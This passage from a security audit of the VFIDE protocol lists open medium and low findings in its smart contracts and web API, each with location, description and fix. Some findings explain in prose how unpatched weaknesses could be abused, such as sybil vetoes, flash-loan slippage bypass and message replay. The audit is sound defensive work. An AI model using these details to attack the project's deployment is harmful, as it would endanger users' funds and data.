- **Recommended fix:** Move threshold check on-chain (read vault balance via `VaultHub.vaultOf(user) + IERC20.balanceOf`, query merchant tx count from MerchantPortal). OR document explicitly that referral crediting is centralized off-chain process and adjust marketing.

### N-M15 — `Seer.calculateOnChainScore` source weight (duplicate restatement: see N-M7)
- [ ] **Status:** open
- **See:** N-M7.

### N-M16 — `Seer.setOperatorLimits` 3-of-5 knobs (duplicate restatement: see N-M6)
- [ ] **Status:** open
- **See:** N-M6.

### N-M17 — `TerminalRegistry.registerTerminal` first-come-first-served on hardware IDs with no proof of possession
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/future/MainstreamPayments.sol` L884-906
- **Description:** `registerTerminal(bytes32 terminalId, ...)` lets any merchant claim any `terminalId` (NFC chip ID, serial number). Real-world NFC chip IDs are not secrets — readable in proximity. A merchant can squat real-world device identifiers and lock out the actual operator.
- **Recommended fix:** Require a hardware-attested signed challenge during registration, OR DAO-attested whitelist, OR pair registration with a recent on-chain payment from that terminal as proof of possession.

### N-M18 — `MerchantPortal.completeRefund` requires merchant EOA approval (incompatible with vault custody)
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/MerchantPortal.sol` L497
- **Description:** `IERC20(r.token).safeTransferFrom(msg.sender, customerVault, r.amount)` — `msg.sender` is the merchant EOA. With vault-only mode active, the merchant cannot easily get tokens to their EOA without using `executeVaultToVaultTransfer` to themselves (a multi-step flow), then granting EOA-level allowance to MerchantPortal. The comment "Pull refund from the merchant caller to avoid requiring approvals from vault contracts" deliberately does this, but for vault-using merchants, refunds are effectively impossible without significant workarounds.
- **Recommended fix:** Add a vault-aware refund path: `completeRefundFromVault(refundId)` that takes the merchant's vault as approver. OR require the merchant's vault to set a refund-only allowance to MerchantPortal as part of merchant onboarding.

### N-M19 — `FiatRampRegistry.recordRampTransaction` allows registered providers to mint up to 70 ProofScore per user with no on-chain proof
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/future/MainstreamPayments.sol` L153-185
- **Description:** A DAO-registered provider calls `recordRampTransaction(user, anyHash, true)` for any user. Provider supplies an arbitrary `externalTxHash`, never verified on-chain. Each call grants up to 50 (first ramp) + 4×5 (subsequent) = 70 score per user-provider pair. With N providers, that's 70×N per user. A single compromised provider can sybil-grant scores at zero cost.
- **Recommended fix:** Cap aggregate ramp-source score contribution per user across all providers. Document the trust assumption. Consider proof-of-deposit (matching on-chain txhash for the corresponding stablecoin movement).

### N-M20 — `Seer.calculateOnChainScore` weight trust (duplicate of N-M7/N-M15)
- [ ] **Status:** open
- **See:** N-M7.

### N-M21 — `AdminMultiSig.communityVeto` requires only `vetoMinScore = 5000` (default new-vault score)
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/AdminMultiSig.sol` L382-412
- **Description:** Veto eligibility is `seer.getCachedScore(msg.sender) >= vetoMinScore` where `vetoMinScore = 5000` (default starting score for any new vault). Vault creation is free and unlimited per address. Sybil-vetoing the protocol requires ~100 distinct addresses with one vault each — gas-only cost. Doc comment claims "100 wallets × 10,000 VFIDE = 1M VFIDE locked", but that holds only in the `vfideToken` fallback path (when `seer == address(0)`). In production seer is set, score-gate path is taken, stake-gate is dead code.
- **Recommended fix:** Set `vetoMinScore` to a non-default level (e.g., 6000+) and re-test sybil cost; OR restore stake-AND-score AND requirement.

### N-M22 — `FeeDistributor` has no rescue/sweep for stranded tokens when a sink reverts
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/FeeDistributor.sol` L172-250
- **Description:** Every sink transfer wrapped in `_safeTransferOut(...)` returning false on failure (emits `DistributionTransferFailed`). No admin rescue / re-route function exists (verified via grep — no `rescue`, `sweep`, `recover`, `withdraw`). If e.g. `merchantPool` becomes a contract that reverts on every `transfer`, that channel's BPS-share of every subsequent `distribute()` accumulates as dust at FeeDistributor. DAO can `proposeSplitChange` to reduce future BPS to 0, but no recovery for stuck tokens.
- **Recommended fix:** Add `onlyDAO` rescue to a recovery address (timelocked) for `balance > totalReceived - totalDistributed + uncommittedReserve`.

### N-M23 — `VFIDETermLoan.extractFromGuarantors` daily timer consumed even when no extraction succeeded
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/VFIDETermLoan.sol` L682-745
- **Description:** `lastExtractionTime[id] = block.timestamp` set at top of function before the loop. Loop iterates guarantors, may emit `GuarantorExtractionSkipped` (revoked allowance, low balance, etc.). If every guarantor skips, lender extracted zero this round but the 1-day cooldown is consumed. Guarantors can coordinate revoke/restore allowance to drain the lender's daily-extraction calls.
- **Recommended fix:** Move `lastExtractionTime[id]` update to after the loop, set only if `totalThisRound > 0`. Add a separate spam-guard that limits the call frequency per lender independent of result.

### N-M24 — Faucet operator key in `process.env.FAUCET_OPERATOR_PRIVATE_KEY` enables 50K-VFIDE/day theft on key leak
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `app/api/faucet/claim/route.ts` L55
- **Description:** Faucet operator private key in env var. On-chain rate limit is per-operator (default 20/day, can rise to 50). On env-leak (CI logs, server-side error including `process.env`, infrastructure breach), attacker calls `claim(attacker, address(0))` 50 times to drain operator-day cap with arbitrary recipient addresses, plus burns ~0.25 ETH/day of gas-distribution. Multi-operator setups multiply the loss.
- **Recommended fix:** Move operator key into HSM/KMS. Restrict the API node's egress to only the RPC endpoint. Add an off-chain recipient-allowlist check (only addresses that completed signed-in flow within the last 5 min).

### N-M25 — `VFIDEFinance.setModules` does two-step DAO rotation but immediately changes `ledger` and `vfideToken`
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/VFIDEFinance.sol` L57-64
- **Description:** Function sets `pendingDAO = _dao` (proper two-step), but immediately mutates `ledger = IProofLedger(_ledger); vfideToken = IERC20(_vfide);`. If the current DAO calls `setModules(maliciousDAO, maliciousLedger, maliciousVFIDE)`, the token and ledger are immediately repointed even though DAO rotation hasn't completed. `sendVFIDE` will route through whichever address the (potentially captured) current DAO chose.
- **Recommended fix:** Timelock all three modules together, OR split into separate setters where the two-step semantics actually apply to all three.

### N-M26 — `AdminMultiSig.communityVeto` (duplicate of N-M21)
- [ ] **Status:** open
- **See:** N-M21.

### N-M27 — `MainstreamPriceOracle._getUniswapPrice` permanently disabled; manual fallback is the only fallback
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/VFIDEPriceOracle.sol` L244-252
- **Description:** Function returns `(0, PriceSource.UNISWAP)` unconditionally with comment "Uniswap TWAP integration is currently disabled". The fallback chain is `Chainlink → Uniswap (always 0) → manual price (owner-set, 48h timelock)`. If Chainlink stales, returns invalid data, or reverts, oracle falls through to manual price. During the 48h window, oracle reverts, taking down every consumer.
- **Recommended fix:** Re-enable Uniswap TWAP fallback, OR add a second Chainlink feed as fallback.

### N-M28 — `VFIDEAccessControl.BLACKLIST_MANAGER_ROLE` is dead code (contradicts H-30 "ACCEPTED RISK")
- [ ] **Status:** open
- **Severity:** medium (cosmetic + audit-trail concern)
- **Location:** `contracts/VFIDEAccessControl.sol` L14, L44
- **Description:** Constant is declared and registered as a role admin'd by `DEFAULT_ADMIN_ROLE`, but nothing in the codebase uses it (no `onlyRole(BLACKLIST_MANAGER_ROLE)`). `CircuitBreaker` uses the renamed `SUSPICIOUS_ACTIVITY_REPORTER_ROLE` (per F-63 fix). The H-30 remediation note "role required for bridge/circuit operations" is no longer accurate.
- **Recommended fix:** Remove `BLACKLIST_MANAGER_ROLE` from VFIDEAccessControl. Update H-30 note in `VFIDE_AUDIT_REMEDIATION_CHECKLIST.md`.

### N-M29 — `SeerAutonomous.beforeAction` is wired only into DAO governance, not the token-transfer path
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/future/SeerAutonomous.sol` L392 (header promises "every transfer triggers enforcement")
- **Description:** `VFIDEToken._transfer` and `CardBoundVault.executeVaultToVaultTransfer` never call `seerAutonomous.beforeAction`. Only DAO.sol calls it (vote/propose paths). All the rate-limit / pattern-detection / oracle-risk machinery in SeerAutonomous fires only when users vote, not when they transfer. The "fully autonomous guardian" architecture is plumbed for governance and a few satellite contracts but not for the actual token movement layer.
- **Recommended fix:** Wire `_enforceSeerAction(...)` into `_transfer`'s vault-mediated path; OR scope down the documentation to match.

### N-M30 — `VaultInfrastructure.UserVaultLegacy.notLocked` modifier is a no-op
- [ ] **Status:** open
- **Severity:** low (cosmetic; promoted from L for tracking)
- **Location:** `contracts/VaultInfrastructure.sol` L159-166
- **Description:** Modifier wraps `_checkNotLocked()`, whose body is a comment-only stub: `// SecurityHub lock check removed — non-custodial, no third-party locks`. All 10+ functions decorated with `notLocked` (`setGuardian`, `setNextOfKin`, `setWithdrawalCooldown`, etc.) carry an annotation that does nothing.
- **Recommended fix:** Remove modifier and its applications, OR replace its body with a documented future-hook comment so it's clear by design.

### N-M31 — `CouncilElection.vote` reads `seer.getScore(msg.sender)` at vote-time rather than snapshotting at election-start
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/future/CouncilElection.sol` L195-209
- **Description:** Eligibility correctly snapshotted via `_eligibleAt(msg.sender, electionStartAt)`, but vote *weight* is `seer.getScore(msg.sender)` — current score. A voter can pump score during the 1-30 day election window via endorsement spam to amplify their vote weight. By contrast, `DAO.vote` freezes weight at proposal-creation time.
- **Recommended fix:** Mirror the DAO pattern — `weight = seer.getScoreAt(msg.sender, electionStartAt)` plus the `SCORE_SETTLEMENT_WINDOW` check.

### N-M32 — `CouncilSalary.distributeSalary` pays in VFIDE despite Howey-compliance commitment to "auto-swap to ETH/USDC"
- [ ] **Status:** open
- **Severity:** medium (Howey/legal risk)
- **Location:** `contracts/future/CouncilSalary.sol` L105-155
- **Description:** Header comment says "Payments via auto-swap to ETH/USDC (not VFIDE)" and "Clear employment relationship (NOT securities)". Actual distribution at L150 calls `token.safeTransfer(eligible[i], payout)` where `token` is the VFIDE ERC-20. No swap. Council members paid in VFIDE — exposing them and the protocol to the Howey concern the contract was designed to avoid.
- **Recommended fix:** Implement the auto-swap before distribution (swap VFIDE → USDC at the start of each cycle, then distribute USDC). OR rewrite the header to match reality and reassess the Howey position.

### N-M33 — `CouncilSalary.setDAO` is instant, no timelock
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/future/CouncilSalary.sol` L90-95
- **Description:** Captured DAO can rotate to attacker-controlled DAO immediately, taking over keeper authorization, reinstatement powers, and term advancement.
- **Recommended fix:** Two-step rotation with 48h delay, mirroring FraudRegistry H-2 fix.

### N-M34 — `VFIDEEnterpriseGateway._swapToStable` slippage protection is tautological by default
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/future/VFIDEEnterpriseGateway.sol` L285-333
- **Description:** `minAmountOut` computed from `getAmountsOut(...)` against the same swap router whose pool the actual swap will execute against. Flash-loan attacker manipulates the pool; the `getAmountsOut` quote moves with it; the slippage check passes; the swap completes at the manipulated price. The H-37 fix added `oracleFloorAmountPerVfide` external floor, but if DAO has not configured it (`oracleFloorAmountPerVfide == 0`, the default), the protection collapses. `setOracleFloor` is also instant, no timelock — captured DAO can zero it out before draining.
- **Recommended fix:** Require `oracleFloorAmountPerVfide > 0` for swaps to proceed (revert otherwise). Timelock `setOracleFloor` with 48h delay.

### N-M35 — `BridgeSecurityModule` retains explicit blacklist/clear-flags admin functions, contradicting non-custodial removal
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/future/BridgeSecurityModule.sol` L230, L282
- **Description:** `setBlacklist(user, status)` and `clearSuspiciousFlags(user)`. Per the project's recent remediation (memory: "Removing all custodial mechanisms — freeze, blacklist, SecurityHub locks, force recovery, vault reassignment"), blacklisting was deliberately removed. This `future/` contract reintroduces the pattern at the bridge layer. If/when deployed, the bridge admin gains unilateral block-by-address authority that the rest of the protocol carefully avoided.
- **Recommended fix:** Delete this contract, or remove the blacklist functions before deploy. Update the H-29 note in `VFIDE_AUDIT_REMEDIATION_CHECKLIST.md` if accepted-risk policy changes.

### N-M36 — `CouncilSalary.distributeSalary` pays in VFIDE (duplicate of N-M32)
- [ ] **Status:** open
- **See:** N-M32.

### N-M37 — `SeerWorkAttestation` is built but disconnected from the pools that pay people
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/future/SeerWorkAttestation.sol` (full); cross-ref pool implementations
- **Description:** Provides verification framework (`verifyTaskCompletion`, `batchVerifyTasks`, `onGovernanceVote`, `onMerchantSettlement`) intended to legitimize the work-for-pay model. But none of `DAOPayrollPool`, `MerchantCompetitionPool`, or `HeadhunterCompetitionPool` reads from it. Pools score participants via their own RECORDER_ROLE-gated functions. The on-chain attestation framework exists but does not actually gate compensation.
- **Recommended fix:** Wire pools to read attestation state before crediting score (e.g., `recordVote` requires `attestation.taskExists(key)`). OR remove SeerWorkAttestation as dead architecture.

### N-M38 — `PayrollManager.emergencyWithdraw` lets DAO drain any stream to any address with no timelock and no participant consent
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/PayrollManager.sol` L341-354
- **Description:** Function `onlyDAO`, sets `s.depositBalance = 0; s.active = false`, transfers to supplied `to`. No notification to payer or payee, no timelock. Contract advertises itself as "Zero legal risk (non-custodial, user-directed)" — emergencyWithdraw contradicts this by giving DAO unilateral confiscation authority over every active stream.
- **Recommended fix:** Either remove the function (let payer call `cancelStream` and recover their own deposit), OR gate behind a 7-day timelock with payer/payee notification.

### N-M39 — `ProofLedger.setDAO` and `setLogger` are instant, no timelock; captured DAO can pollute the immutable event log
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `contracts/ProofLedger.sol` L37, L43
- **Description:** Both setters are instant `onlyDAO`. `setLogger` lets DAO authorize any address as a logger; logger can then emit `SystemEvent`/`EventLog`/`TransferLog` events that downstream off-chain ProofScore computation may treat as authoritative. Within `MAX_LOGS_PER_BLOCK = 50` per logger, a captured logger can bury legitimate signals in noise.
- **Recommended fix:** 48h timelock on both setters. Match the FraudRegistry H-2 pattern.

### N-M40 — `app/api/remittance/beneficiaries/route.ts` collects PII contradicting the public privacy claim
- [ ] **Status:** open
- **Severity:** medium
- **Location:** `app/api/remittance/beneficiaries/route.ts` L74-82
- **Description:** Persists `name`, `phone`, `account_number`, `wallet_address`, `country`, `relationship` per beneficiary, indexed by `owner_address`. This is significantly more PII than the project's stated philosophy permits ("VFIDE never collects PII; KYC handled by external on-ramp providers only"). Stored in plaintext (no `pgp_sym_encrypt` visible) in `remittance_beneficiaries`. RLS doesn't apply because the SQL uses normal `query()` with no `SET app.current_user_address` context — protection is application-level WHERE clauses only. If DB or backups are compromised, this leaks remittance recipient identities and account numbers across the user base whose threat model may include hostile state actors.
- **Recommended fix:** Encrypt at rest (PG `pgp_sym_encrypt` with key in KMS), OR store client-side only (encrypted with user's PQ key, blob stored on server), OR update the public privacy claim to match reality.

---

## Low / Informational (38)

### N-L1 — `VFIDETestnetFaucet.batchClaim` whole-batch revert (duplicate of N-M1)
- [ ] **Status:** open — **See:** N-M1.

### N-L2 — `setEcosystemVault` zero-check (duplicate of N-M2)
- [ ] **Status:** open — **See:** N-M2.

### N-L3 — burn portion irreversible (duplicate of N-M3)
- [ ] **Status:** open — **See:** N-M3.

### N-L4 — `processDismissedComplaintPenalties` opt-in (duplicate of N-M4)
- [ ] **Status:** open — **See:** N-M4.

### N-L5 — Permit hardcoded literal (duplicate of N-M5)
- [ ] **Status:** open — **See:** N-M5.

### N-L6 — POST `/api/auth` returns JWT in JSON body (HIGH-severity restatement: see N-H20)
- [ ] **Status:** open — **See:** N-H20.

### N-L7 — Step-up failure leaks internal `error.message`
- [ ] **Status:** open
- **Severity:** low
- **Location:** `app/api/transactions/export/route.ts` L569
- **Description:** Returns `error: error.message` to the client, exposing DB/internal error details.
- **Recommended fix:** Generic message to client, full detail to server logs.

### N-L8 — `/api/users/invite` enumeration oracle (mitigated)
- [ ] **Status:** open (cosmetic)
- **Severity:** low
- **Location:** `app/api/users/invite/route.ts`
- **Description:** Returns boolean valid/invalid for a code. With 12-char base62 entropy and rate limits, not practically exploitable. Case-sensitive duplicate check (`WHERE code = $1`) vs case-insensitive validate check (`WHERE LOWER(code) = $1`) creates a small inconsistency where two distinct codes can validate as one.
- **Recommended fix:** Make duplicate check case-insensitive too, OR enforce case-canonicalization at code generation.

### N-L9 — Modulo bias in invite-code RNG
- [ ] **Status:** open
- **Severity:** low (cosmetic with 12-char codes)
- **Location:** `lib/inviteLinks.ts` L42; `app/api/groups/invites/route.ts` L60
- **Description:** `bytes[i] % 62` introduces a small bias (chars at positions 0-3 appear ~25% more often).
- **Recommended fix:** Rejection sampling (re-roll if `byte >= 248`, the largest multiple of 62 below 256).

### N-L10 — `/api/community/stories` is unauthenticated
- [ ] **Status:** open
- **Severity:** low
- **Location:** `app/api/community/stories/route.ts`
- **Description:** Returns up to 20 unexpired `market_stories` rows with no auth. If `market_stories` ever stores anything that isn't fully public-by-design, this leaks.
- **Recommended fix:** Document the public contract. Add a CI check that `market_stories` schema only contains public-safe fields.

### N-L11 — `formatAsPDF` returns `Content-Type: text/html`
- [ ] **Status:** open
- **Severity:** low
- **Location:** `app/api/transactions/export/route.ts` L513
- **Description:** Browser renders rather than downloads, contradicting the user-facing "PDF export" promise. Comment acknowledges this is a placeholder.
- **Recommended fix:** Add a real PDF generator (e.g., `pdfkit`, `puppeteer`), OR rebrand as "HTML export" honestly.

### N-L12 — `MerchantPortal._transferWithAutoConvert` silent downgrade
- [ ] **Status:** open
- **Severity:** low
- **Location:** `contracts/MerchantPortal.sol` L971-985
- **Description:** When `autoConvert[merchant] && token != stablecoin`, function emits `AutoConvertFallback(...,"auto_convert_disabled_pending_safe_pricing")` and falls through to a normal token transfer. Merchant set `autoConvert=true` and expects stablecoins; gets the original token. UX promise mismatch.
- **Recommended fix:** Reject the call (`revert`), OR escalate to off-chain monitoring with a louder signal.

### N-L13 — `SubscriptionManager.processPayment` does not check fraud status
- [ ] **Status:** open
- **Severity:** low (covered indirectly by N-C4 fix)
- **Location:** `contracts/future/SubscriptionManager.sol::processPayment`
- **Description:** Same gap as N-H9 but at the subscription layer. A flagged user keeps paying subscriptions; a flagged merchant keeps collecting them. With the N-C4 fix, the underlying `_transfer` would correctly resolve the user from the vault, so this is mitigated indirectly — but explicit check at the subscription layer is more defensive.
- **Recommended fix:** Add `_checkFraudStatus(subscriber)` and `_checkFraudStatus(merchant)` in `processPayment`.

### N-L14 — `VFIDEBridge._lzReceive` does not check fraud status of receiver
- [ ] **Status:** open
- **Severity:** low (covered by N-C4 fix indirectly)
- **Location:** `contracts/future/VFIDEBridge.sol` L416-470
- **Description:** Bridged-in tokens released to receiver via `safeTransfer`, which routes through `_transfer` and is subject to the N-C4 fix once applied. Note: bridge layer doesn't add its own fraud check.
- **Recommended fix:** Optional defense-in-depth: explicit `fraudRegistry.requiresEscrow(_resolveFeeScoringAddress(receiver))` check in `_lzReceive`.

### N-L15 — `SessionKeyManager` is a complete, unintegrated contract
- [ ] **Status:** open
- **Severity:** low
- **Location:** `contracts/future/MainstreamPayments.sol` L549-836
- **Description:** 287-line session-key implementation with `canSpend`, `recordSpend`, `_enforceSeerAction`. No other contract calls it (verified via grep). Records sessions in storage and burns gas, but no on-chain spending checks against it.
- **Recommended fix:** Wire into MerchantPortal as the comment suggests (`SessionKeyManager` would be added as an `authorizedSpendRecorder`), OR remove from production deployment.

### N-L16 — Websocket server has `broadcast` exported but no caller
- [ ] **Status:** open
- **Severity:** low
- **Location:** `websocket-server/src/index.ts` L380
- **Description:** Function exported, no internal call exists, no HTTP/Redis bridge accepts external trigger events. Clients can subscribe to topics, but no events ever arrive. Real-time features (chat, presence, governance updates) are half-built.
- **Recommended fix:** Wire a Redis subscriber or HTTP endpoint that calls `broadcast(...)` on protocol events. OR document that real-time events require an unimplemented bridge.

### N-L17 — `SeerGuardian.setDAO` instant rotation, no timelock
- [ ] **Status:** open
- **Severity:** low (medium if SeerGuardian is wired into mainnet governance)
- **Location:** `contracts/future/SeerGuardian.sol` L215-220
- **Description:** Unlike H-2 fix in FraudRegistry (48h timelock for DAO rotation), SeerGuardian's DAO rotation is `external onlyDAO` and instant. Captured DAO can rotate to attacker-controlled DAO without delay and immediately abuse `seerFlagProposal`/`recordViolation`.
- **Recommended fix:** 48h timelock pattern.

### N-L18 — `CommerceEscrow.dispute` lacks `nonReentrant` while peer functions have it
- [ ] **Status:** open
- **Severity:** low (cosmetic)
- **Location:** `contracts/VFIDECommerce.sol` L248
- **Description:** Function only mutates state and calls `merchants._noteDispute(...)` which doesn't transfer tokens, but consistency with peer functions reduces audit surface.
- **Recommended fix:** Add `nonReentrant`.

### N-L19 — `DAOTimelock.execute` admin-only; secondary executor recovery requires `secondaryExecutor` rotation runbook
- [ ] **Status:** open (operational)
- **Severity:** low
- **Location:** `contracts/DAOTimelock.sol` L131-158
- **Description:** Mitigation exists (TL-02 / H-8) — `executeBySecondary` after `min(SECONDARY_EXECUTOR_DELAY, EXPIRY_WINDOW/2)` — but `secondaryExecutor` is a single address. If both DAO admin and secondary are unresponsive, queued ops expire silently.
- **Recommended fix:** Document operational runbook for rotating `secondaryExecutor`. Consider adding a secondary multisig.

### N-L20 — `app/api/messages/route.ts` validates the `sig` field structurally only; never ECDSA-recovers
- [ ] **Status:** open
- **Severity:** low
- **Location:** `app/api/messages/route.ts` L82-88
- **Description:** `sig` must match `/^0x[0-9a-fA-F]{130}$/` but the server never recovers `(ts, nonce, ciphertext) → signer` and never compares to `from`. Receiver's client is implicitly trusted to verify.
- **Recommended fix:** Document the trust boundary, OR perform server-side `verifyMessage` against the `from` address.

### N-L21 — `app/api/messages/route.ts` replay-detection only catches identical-content
- [ ] **Status:** open
- **Severity:** low
- **Location:** `app/api/messages/route.ts` L379-385
- **Description:** 10-minute SQL `WHERE content = $3` blocks exact-content replays. Because `nonce` is part of the encrypted payload JSON, an attacker takes a captured ciphertext, changes the `nonce`, and the SQL string-equality check no longer matches — replay through. The encrypted-payload schema includes `nonce` to prevent replay at the crypto layer, but the server-side dedup is layered on the wrong surface.
- **Recommended fix:** Move replay check to a `(sender_id, recipient_id, nonce)` uniqueness constraint on the `messages` table, OR hash-of-ciphertext.

### N-L22 — `DutyDistributor.maxPointsPerUser = 10_000` and `pointsPerVote = 10` cap users at 1000 lifetime votes
- [ ] **Status:** open
- **Severity:** low (UX)
- **Location:** `contracts/DutyDistributor.sol` L48 + L41
- **Description:** After 1000 votes, the per-user cap is hit and further votes do not earn duty points. Long-term active voters silently stop accruing recognition.
- **Recommended fix:** Document the UX implication, OR adjust the cap upward, OR introduce a yearly cap rather than lifetime.

### N-L23 — `VFIDEFinance.noteVFIDE` accepts a self-reported amount with no on-chain verification
- [ ] **Status:** open
- **Severity:** low
- **Location:** `contracts/VFIDEFinance.sol` L122-127
- **Description:** Authorized notifiers (after the 48h timelock) can call `noteVFIDE(amount, from)` to increment `totalReceived` — without verification VFIDE actually moved. Compromised authorized notifier can inflate `totalReceived` indefinitely. The 48h timelock on becoming a notifier is the only gate.
- **Recommended fix:** Read `vfideToken.balanceOf(this)` and reconcile, OR document the trust boundary on authorized notifiers.

### N-L24 — `VFIDEBadgeNFT` is soulbound with no burn path; lost-wallet badges unreachable
- [ ] **Status:** open
- **Severity:** low (UX)
- **Location:** `contracts/future/VFIDEBadgeNFT.sol` L189-200
- **Description:** `_update` reverts on any transfer where both `from` and `to` are non-zero. No `burn()` exposed. Once minted to wallet A, never moved. If user later loses access to A, badge stays at A forever.
- **Recommended fix:** Provide an admin-burn path (DAO-gated), OR allow minting at a new wallet if Seer still says badge is owned.

### N-L25 — `SeerGuardian.setDAO` instant rotation (duplicate of N-L17)
- [ ] **Status:** open — **See:** N-L17.

### N-L26 — `CommerceEscrow.dispute` lacks `nonReentrant` (duplicate of N-L18)
- [ ] **Status:** open — **See:** N-L18.

### N-L27 — `lib/auth/middleware.requireAdmin` rejects users matching `OCP.owner()` but not in `ADMIN_ADDRESSES` env
- [ ] **Status:** open
- **Severity:** low (operational fragility)
- **Location:** `lib/auth/middleware.ts` L130-200
- **Description:** Requires both `isAdmin(user)` (env-list check) AND `verifyOnChainAdmin(address)` (matches `OCP.owner()`). If env drifts from on-chain owner (e.g., after OCP ownership transfer), admin endpoints reject the legitimate on-chain admin.
- **Recommended fix:** Treat env as a hint; rely on on-chain only, OR document the rotation runbook and add a CI check.

### N-L28 — `ADMIN_ADDRESSES` loaded once at module init; rotation requires process restart
- [ ] **Status:** open
- **Severity:** low (operational)
- **Location:** `lib/auth/middleware.ts` L120
- **Description:** Standard module-level constant pattern. Admin rotation via `ADMIN_ADDRESSES` env requires Next.js process restart.
- **Recommended fix:** Document; consider hot-reload via `getEnv()` per request (with caching).

### N-L29 — `app/api/pos/charge/route.ts` returns `chargeId = pos_${Date.now()}` and persists nothing
- [ ] **Status:** open
- **Severity:** low (correctness/UX)
- **Location:** `app/api/pos/charge/route.ts`
- **Description:** Route accepts auth, validates input, returns "pending" envelope. No DB-touching step. Frontend may treat this as a confirmed charge intent; backend has no record. Predictable `chargeId` (Date.now() ms collision possible across multiple terminals).
- **Recommended fix:** Persist to a `pos_charges` table, OR document explicitly as a stateless echo. Use UUID for `chargeId` if persisted.

### N-L30 — `app/api/seer/analytics/rollup/route.ts` is gated behind double-check `requireAdmin`
- [ ] **Status:** open (operational)
- **Severity:** low
- **Location:** `app/api/seer/analytics/rollup/route.ts`; `lib/auth/middleware.ts::requireAdmin`
- **Description:** Per N-L27/N-L28, in environments where `OCP_ADDRESS` is unset and `NODE_ENV === 'production'`, the rollup endpoint is permanently inaccessible.
- **Recommended fix:** Verify env config matches deployment expectations; add a startup check that fails closed if `OCP_ADDRESS` is missing in production.

### N-L31 — `CouncilSalary.currentTerm` only incremented manually via `startNewTerm()` (DAO-only)
- [ ] **Status:** open
- **Severity:** low
- **Location:** `contracts/future/CouncilSalary.sol` L85-88
- **Description:** If DAO forgets to advance the term after a council election cycle, removal-vote counters do not reset between terms. The mapping `removalVotesInTerm[currentTerm][target][voter]` accumulates across actual term boundaries.
- **Recommended fix:** Auto-advance on `applyCouncil` (callback from CouncilElection), OR document the DAO runbook responsibility prominently.

### N-L32 — `components/seo/StructuredData.tsx::FAQSchema` does not pass `faq.question`/`faq.answer` through `sanitizeJsonLdString`
- [ ] **Status:** open
- **Severity:** low (SEO surface, not security)
- **Location:** `components/seo/StructuredData.tsx` L160-183
- **Description:** Merchant/product schemas correctly sanitize all user-supplied fields. FAQs are passed unsanitized. `safeJsonLd` escapes `<` to prevent `</script>` breakouts but won't prevent merchants injecting misleading schema.org subtypes (e.g., bogus `aggregateRating`) inside FAQ text strings.
- **Recommended fix:** Apply `sanitizeJsonLdString` to `faq.question` and `faq.answer`.

### N-L33 — `lib/postQuantumEncryption.ts` keeps PQ private keys in process memory only
- [ ] **Status:** open (by design)
- **Severity:** low (UX cost)
- **Location:** `lib/postQuantumEncryption.ts` L740-757
- **Description:** Refresh requires re-derivation. By design — XSS-resistant only as long as no XSS exists.
- **Recommended fix:** Document UX implication.

### N-L34 — `app/api/privacy/delete/route.ts` only queues a deletion request; no automatic deletion happens
- [ ] **Status:** open
- **Severity:** low (compliance)
- **Location:** `app/api/privacy/delete/route.ts` L43-53
- **Description:** Inserts into `privacy_deletion_requests` with `status='pending'` and trusts an out-of-band operator to delete. GDPR Article 17 / CCPA timing requirements (~30 days) make queue depth a compliance liability if processing falls behind.
- **Recommended fix:** Add SLA / runbook reference. Consider auto-processing for low-risk users (no merchant relationships, no active escrows).

### N-L35 — `SeerPolicyGuard.setDAO` is instant while `setSeer` is two-step migration; inconsistent
- [ ] **Status:** open
- **Severity:** low
- **Location:** `contracts/future/SeerPolicyGuard.sol` L57 vs L73-95
- **Description:** Seer swap correctly uses `beginSeerMigration → finalizeSeerMigration` with policy-consumption frozen during handoff. DAO swap is one call, no migration window, no timelock.
- **Recommended fix:** Mirror the migration pattern for DAO rotation.

### N-L36 — `SystemHandover.executeHandover` doesn't actually call `setAdmin` on DAO/Timelock; relies on dev pre-configuring via governance
- [ ] **Status:** open (operational, by design)
- **Severity:** low
- **Location:** `contracts/SystemHandover.sol` L214-240
- **Description:** Function asserts `dao.admin() == newAdmin` and `timelock.admin() == address(dao)` and then sets `devMultisig = address(0)`. Dev must have used DAO's governance flow to set admins correctly before calling. No path for the *DAO itself* to drive its own handover — depends on dev's correct sequencing.
- **Recommended fix:** Document the runbook explicitly. Add a precondition view function (`canExecuteHandover() returns (bool, string memory reason)`) so the dev can dry-run.

### N-L37 — `app/api/auth/route.ts` uses `verifyMessage` from `viem` which accepts EIP-1271 contract-wallet signatures
- [ ] **Status:** open
- **Severity:** low (architectural caveat)
- **Location:** `app/api/auth/route.ts` L155-160
- **Description:** Correct for SIWE compatibility, but means a contract wallet returning true on `isValidSignature(...)` for any hash effectively bypasses signature verification. If a vault contract has a buggy `isValidSignature` (e.g., always returns the magic value), anyone who knows the address can authenticate as that vault.
- **Recommended fix:** Document the trust assumption: protocol must avoid making any vault contract accept arbitrary signatures. Add a CI check on vault `isValidSignature` implementations.

### N-L38 — `ServicePool.emergencyWithdraw` is `DEFAULT_ADMIN_ROLE` only and bypasses `pause`/`unpause`
- [ ] **Status:** open (by design)
- **Severity:** low
- **Location:** `contracts/ServicePool.sol` L300-306
- **Description:** Pulls all `balance - totalCommitted` to `to`. No timelock, no participant warning. Acceptable for true emergencies but worth documenting.
- **Recommended fix:** Document. Consider a 24h timelock on emergencyWithdraw.

---

## Coverage caveat

This audit reviewed in some depth: every production contract, most future contracts, the auth + RLS stack, the websocket server, ~40 of 122 API routes, and a partial frontend pattern-search (XSS / `dangerouslySetInnerHTML`, browser storage, `NEXT_PUBLIC_*` env exposure, SIWE auth flow).

**Significant unreviewed surface** — likely contains additional findings:

